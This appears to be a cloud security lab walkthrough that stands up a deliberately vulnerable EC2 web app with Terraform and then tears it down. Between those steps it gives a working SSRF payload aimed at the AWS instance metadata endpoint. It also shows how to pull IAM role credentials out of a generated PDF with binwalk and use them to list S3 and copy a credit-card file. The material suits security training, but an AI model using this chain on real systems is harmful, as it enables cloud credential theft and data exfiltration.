### EC2 Compromise 

---

- Step 1: Open terminal

- Step 2: Change Directory

```bash
cd /root/COMPROMISE_EC2/
```

- Step 3: Run `terraform init` to install related packages.

```commanline
terraform init
```

- Step 4: Run `terraform apply -auto-approve`

```commanline
terraform apply -auto-approve
```
Step 5: Open browser and access the EC2 DNS at port 3000
```commanline
http://ec2-x-x-x-x.us-west-2.compute.amazonaws.com:3000
```

- Step 6: Click on sign up and fill the fields at Remarks please specify

```commanline
<link rel=attachment href="http://169.254.169.254/latest/meta-data/iam/security-credentials/ssrf_role">
```


- Step 7: Now Login using the credentials and click on Generate PDF and download the PDF

```commanline
http://ec2-x-x-x-x.us-west-2.compute.amazonaws.com:3000/genpdf
```

- Step 8: Do a "binwalk on `pdf name`"

```commanline
binwalk -e genpdf.pdf
```
-step 9: It will extract the pdf in zip format


-step 10: Extract the zip and see one of the file has a ssrf_role credentials

- Step 11: Copy AccessKey, Secretkey and Session Token

- Step 12: Type the following steps in the terminal at the specific Lab location

  - `export AWS_ACCESS_KEY_ID=<copied AccessKeyId>`
  - `export AWS_SECRET_ACCESS_KEY=<copied SecretAccessKey>`
  - `export AWS_SESSION_TOKEN=<copied SessionToken>`

- Step 13: List the s3 buckets

```commanline
aws s3 ls
```
- step 14: Access the objects in the bucket
```commanline
aws s3 ls s3://v5v0ku8akk-ssrf
aws s3 cp s3://v5v0ku8akk-ssrf/creditcardnumbers.txt stealcredicard.txt
```


### Teardown

- Step 1: To delete all the resources `terraform destroy -auto-approve`

```bash
cd /root/COMPROMISE_EC2/
```

```commanline
terraform destroy -auto-approve
```



